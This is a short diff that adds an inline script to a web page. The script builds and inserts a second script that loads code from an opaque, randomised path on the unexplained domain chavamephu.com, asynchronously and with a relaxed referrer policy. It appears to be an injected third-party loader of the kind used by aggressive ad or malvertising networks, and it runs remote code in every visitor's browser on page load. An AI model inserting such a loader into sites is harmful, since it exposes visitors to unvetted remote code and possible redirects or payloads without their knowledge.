@@ -1,0 +1,12 @@
+<script>
+(function(ndt){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = ndt || {};
+s.src = "\/\/chavamephu.com\/b.XQV\/srd\/GalY0cYIWdcC\/jeUm\/9\/uvZRUXl-k\/PTTvYtyRMpzJIB2NMUzfUOtBNXjjIFz\/MVjpYkzsNzgh";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
